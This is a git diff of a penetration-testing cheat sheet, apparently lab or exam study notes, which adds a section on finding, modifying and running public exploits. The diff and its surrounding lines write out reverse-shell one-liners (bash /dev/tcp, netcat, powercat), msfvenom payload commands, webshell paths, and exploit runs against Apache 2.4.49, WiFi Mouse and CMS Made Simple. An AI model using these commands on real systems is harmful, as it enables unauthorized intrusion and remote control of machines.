@@ -4,6 +4,7 @@
 - [Encode-Decode-Hash](#encode-decode-hash)
 - [Reverse shell](#reverse-shell)
 - [Files transfer](#files-transfer)
+- [Public exploit](pPublic-exploit)
 - [Remote to other machines](#remote-to-other-machines)
 - [Ports scan](#ports-scan)
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
@@ -373,12 +374,12 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - [Reverse Shell Generator](https://www.revshells.com/)
   - Linux `echo $0`  
     - /bin/sh  
-    - Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
+    - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
     - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
     - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
   - Windows `echo %COMSPEC%`  
     - cmd.exe  
-    - PowerShell:
+    - ❗ Windows with PowerShell:
       `powercat -c <KALI_IP> -p 4444 -e powershell`
       ```
       #Kali
@@ -415,16 +416,12 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
           $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
           powershell -EncodedCommand $encoded
           ```
-     5. Get reverse shell successfully  
-  - check if the port is open (FW might block)  
-    `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`   
-- Kali listener
-  `nc -lvnp 443`
-- ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+     5. Get reverse shell successfully   
+- PHP injection/ ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
   - aspx: cmdasp.aspx
   - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
   - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
-- generate reverse shell payload  
+- File upload allowed  
   **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
   **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
   **step 3 generate payload based on target platform**  
@@ -433,7 +430,11 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
   - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
   - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
-  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
+  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`
+- check if the port is open (FW might block)  
+  `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`  
+- Kali listener
+  `nc -lvnp 443`
     
 **Tips:**  
   - Always match LPORT between payload and nc  
@@ -520,7 +521,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
      target: copy C:\path\to\file.txt \\<Kali-IP>\share\
 
      smbclient -L \\\\192.168.171.10
-     smbclient \\\\192.168.171.10\\Users -N
+     smbclient \\\\192.168.171.10\\<SHARE FOLDER NAME> -N #anonymous access
      smb: \> ls
      smb: \offsec\Downloads\> get flag.txt
      
@@ -551,6 +552,34 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
       ```
     - SCP
       `scp file.txt kali@<kali_ip>:/home/kali/`
+
+# Public exploit  
+- Search exploit by service + version  
+  `searchsploit vsftpd 2.3.4`
+- common search words
+  E.g: proftpd 1.3.5, joomla rce, kernel 5.x, samba, apache 2.4.49 rce,  ms17_010, windows iis rce, searchsploit linux kernel 5.4, CVE-2017-0144, windows local privilege escalation  
+- Copy exploit locally    
+  `searchsploit -m 12345.c`
+- Fixing/Modifying exploits
+  - change IP/port for reverse shell
+  - adjust target path in web RCE
+  - modify payload type cmd.exe, powershell, /bin/bash 
+- Compile exploit in kali
+  - Compiling the exploit: `kali@kali:~ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
+  - setting up a Netcat listener on port 443: `kali@kali:~$ sudo nc -lvp 443`  
+  - Running the final version of the exploit: `kali@kali:~ sudo wine syncbreeze_exploit.exe`  
+- attack WiFi Mouse 1.7.8.5 - Remote Code Execution
+  - `searchsploit "mouse server"`: windows/remote/50972.py
+  - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
+  - start webserver, and listener
+  - `python3 mouseserver_50972.py <target> <kali> shell64.exe`  
+- attack Apache httpd 2.4.49 - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh  
+  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`  
+- attack CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution  
+  - modify 44976.py (credentials, url, verify=false)
+  - `python2 44976.py`  
+  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`   
 
 # Remote to other machines
 
